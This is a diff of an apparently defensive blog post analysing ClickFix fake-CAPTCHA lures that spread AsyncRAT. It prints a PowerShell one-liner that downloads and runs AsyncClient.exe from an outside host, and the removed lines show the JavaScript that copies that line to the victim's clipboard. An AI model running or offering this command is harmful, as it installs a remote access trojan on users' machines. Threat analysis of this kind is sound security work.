@@ -143,7 +143,7 @@ And from [ܛܔܔܔܛܔܛܔܛ's Tweet](https://x.com/skocherhan/status/1889754939
 
 Or from [Lumma Stealer ClickFix](https://www.silentpush.com/blog/lumma-stealer/)
 
-![Lumma Stealer ClickFix](/assets/img/clickfix_copypaste_lumma.png)
+![Lumma Stealer ClickFix](/assets/img/clickfix_copypaste_lumma.png){: w="400" h="200" }
 
 These Copy-Paste has
 * The **embeded a javascript contain a powershell script** 
@@ -181,34 +181,39 @@ Example Screenshot:
 
 ![ClickFix Powershell Script](/assets/img/clickfix_server_ps_script.png)
 
-```javascript
-        document.getElementById("checkbox").addEventListener("click", function() {
-            let verifyWindow = document.getElementById("verify-window");
-            verifyWindow.classList.add("show");
-            generateRandomID();
-        });
+We extracted the Powershell Script this Powershell contain few UIL such as:
 
-        function generateRandomID() {
-            let randomID = Math.floor(100000 + Math.random() * 900000);
-            document.getElementById("verification-id").innerText = randomID;
-            copyPayload(randomID);
-        }
+* AsyncClient.exe
+* URL: 2ur.jp/NJgY
 
-        function copyPayload(id) {
-            const payload = `powershell -Command Invoke-WebRequest -Uri 'https://2ur.jp/NJgY' -OutFile $env:USERPROFILE\\AsyncClient.exe; Start-Process -FilePath $env:USERPROFILE\\AsyncClient.exe -Wait # ✅ ''I am not a robot - reCAPTCHA Verification ID: ${id}''`;
-            navigator.clipboard.writeText(payload).then(() => {
-                console.log("Payload copied to clipboard with ID:", id);
-            }).catch(err => {
-                console.error("Clipboard copy failed: ", err);
-            });
-        }    
+Powershell Script:
+
+```powershell
+powershell -Command Invoke-WebRequest -Uri 'https://2ur.jp/NJgY' -OutFile $env:USERPROFILE\\AsyncClient.exe; Start-Process -FilePath $env:USERPROFILE\\AsyncClient.exe -Wait # ✅ ''I am not a robot - reCAPTCHA Verification ID: ${id}''`;
 ```
 
-We found another domain: **hxxps://2ur[.]jp/NJgY** which will download a **AsycnClient.exe**, We will use URLScan.io to scan this domain you can access this link [https://urlscan.io/result/17cf8a96-fad0-47a3-b018-e0436b877f12/#transactions](https://urlscan.io/result/17cf8a96-fad0-47a3-b018-e0436b877f12/#transactions)
+Whois information for the domain: **2ur.jp** 
 
-Which it will redirect to **hxxps://196.251.113[.]41/AsyncClient.exe** with the file hash 284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76 and if you ever to search the hash on the VirusTotal (VT) -> ALL RED VT Link: [https://www.virustotal.com/gui/file/284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76](https://www.virustotal.com/gui/file/284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76)
+![Whois Information](/assets/img/whois_2ur.png)
 
+We found another domain: **hxxps://2ur[.]jp/NJgY** which will download a **AsycnClient.exe**, We will use URLScan.io to scan this domain you can access this link:
 
+[https://urlscan.io/result/17cf8a96-fad0-47a3-b018-e0436b877f12/#transactions](https://urlscan.io/result/17cf8a96-fad0-47a3-b018-e0436b877f12/#transactions)
+
+Which it will redirect to **hxxps://196.251.113[.]41/AsyncClient.exe** with the file hash 284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76 and if you ever to search the hash on the VirusTotal (VT) -> ALL RED VT Link: 
+
+[https://www.virustotal.com/gui/file/284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76](https://www.virustotal.com/gui/file/284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76)
+
+![VT Information for the AsyncClient](/assets/img/VTpictures.png)
+
+-> Which is an AsyncRAT
+
+Well but look like I'm quite late on this discovery because on VT there are a lot of folk, vendors that has discover this and have quite extensive information on this
+
+![VT Information](/assets/img/VTInformation_2.png)
+
+> Why am I check so much information? To be honest this isn't all of the information I gather
+{: .prompt-info }
 
 
 **Captcha Page**
